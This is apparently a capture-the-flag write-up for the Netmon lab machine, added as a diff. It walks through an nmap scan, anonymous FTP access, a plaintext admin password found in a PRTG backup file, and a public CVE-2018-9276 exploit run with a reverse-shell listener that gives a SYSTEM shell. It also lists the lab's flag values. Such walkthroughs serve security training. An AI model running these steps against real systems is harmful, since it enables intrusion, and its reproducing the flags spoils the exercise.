@@ -1,0 +1,158 @@
+Machine: Netmon
+TARGET: 10.129.197.170
+
+
+
+Task 1
+
+What is the name of the application running on port 80? Given the three words in the logo.
+
+
+nmap -sV -sC -oA nmap/Netmon 10.129.230.176
+
+PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       <DIR>          inetpub
+| 07-16-16  09:18AM       <DIR>          PerfLogs
+| 02-25-19  10:56PM       <DIR>          Program Files
+| 02-03-19  12:28AM       <DIR>          Program Files (x86)
+| 02-03-19  08:08AM       <DIR>          Users
+|_11-10-23  10:20AM       <DIR>          Windows
+80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+> PRTG Network Monitor 
+
+
+Task 2
+
+What service is running on TCP port 21?
+
+> FTP
+
+ftp anonymous로 접속
+
+
+
+Submit User Flag
+
+Submit the flag located on the Public user's desktop
+
+
+get /Users/Public/Desktop/user.txt
+cat user.txt
+
+> 6471d785b2b4095cac5e40105591ce41
+
+
+
+
+
+
+
+
+Task 4
+
+What is the full path of the folder where PRTG Network Monitor saves its configuration files by default?
+
+google search "prtg network monitor configuration location"
+
+PRTG Network Monitor stores its configuration, monitoring data, logs, and other essential files in the PRTG data directory, which defaults to C:\ProgramData\Paessler\PRTG Network Monitor. This folder includes the database, logs, and configuration files. The program files (like the core server installation) are stored in the installation path, which is typically C:\Program Files (x86)\PRTG Network Monitor on 64-bit systems. 
+
+> C:\ProgramData\Paessler\PRTG Network Monitor
+
+
+
+Task 5
+
+What is the name of the backup config file?
+
+/programdata/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak
+
+
+> PRTG Configuration.old.bak
+
+
+
+Task 6
+
+What was the prtgadmin user's password according to that file?
+
+grep -A 10 'prt' PRTG\ Configuration.old.bak
+
+ <!-- User: prtgadmin -->
+              PrTg@dmin2018
+            </dbpassword>
+            <dbtimeout>
+              60
+            </dbtimeout>
+            <depdelay>
+              0
+            </depdelay>
+            <dependencytype>
+              0
+
+
+> PrTg@dmin2018
+
+
+
+Task 7
+
+What is the prtgadmin user's password on the website now?
+machines 당시 2019년도
+
+> PrTg@dmin2019
+
+Task 8
+
+What version of PRTG is installed?
+
+prtgadmin
+PrTg@dmin2019
+로 웹사이트 로그인후 update available로 들어가면 
+현재 버전정보 확인가능 18.1.37.13946
+
+> 18.1.37.13946
+
+Task 9
+
+Which user is this software running as by default? Don't include anything before a \.
+
+https://github.com/A1vinSmith/CVE-2018-9276/blob/main/exploit.py
+python exploit.py -i 10.129.197.170 -p 80 --lhost 10.10.14.99 --lport 9999 --user prtgadmin --password PrTg@dmin2019 
+
+whoami
+nt authority\system
+> system
+
+
+Submit Root Flag
+
+Submit the flag located on the administrator's desktop.
+
+C:\Users\Administrator\Desktop\root.txt
+
+> df57e711fe414afc1356baaf35e33be3
+
+
+
+
+
+
+
+
